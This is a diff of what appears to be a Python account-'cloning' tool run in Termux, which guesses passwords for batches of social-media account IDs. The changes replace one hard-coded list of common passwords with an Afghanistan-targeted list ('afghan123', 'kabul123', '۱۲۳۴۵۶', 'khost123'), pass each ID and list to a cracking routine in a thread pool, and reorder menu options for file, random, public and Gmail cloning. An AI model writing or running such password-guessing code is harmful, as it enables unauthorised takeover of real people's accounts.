@@ -527,7 +527,7 @@ def menu():
 		create_file_login()
 	elif xd in ['3','03']:
 		public()
-	elif xd in ['4','04']:
+	elif xd in ['2','02']:
 		clear()
 		print(' [1] Afghanistan cloning\n [2] Random cloning\n [3] gmail cloning\n [0] Back menu')
 		linex()
@@ -589,9 +589,9 @@ def pak():
 				if pcs in ['1','01']:
 					passlist = [psx,ids]
 				elif pcs in ['2','02']:
-					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234']
+					passlist = [psx,ids,'afghan123','khan123','kabul123','۱۲۳۴۵۶']
 				else:
-					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234','Ali123','ali786','khan123','khan12345']
+					passlist = [psx,ids,'afghan123','khan123','786786','kabul1234','kabul123','۱۲۳۴۵۶','afghanistan','khost123']
 				if mthd in ['1','01']:
 					AXI.submit(rcrack1,ids,passlist)
 				else:
@@ -935,9 +935,9 @@ def menu_apikey():
  \033[1;37m[2]you unstall termux and key need approval
 ================================================== 
  [*] File cloning
- [*] Create file
- [*] Public cloning
  [*] Random cloning
+ [*] Public cloning
+ [*] Create file
  [*] Gmail cloning
  [*] Separate ids
  [*] remove dublicate lines from file              [8] login another cookie
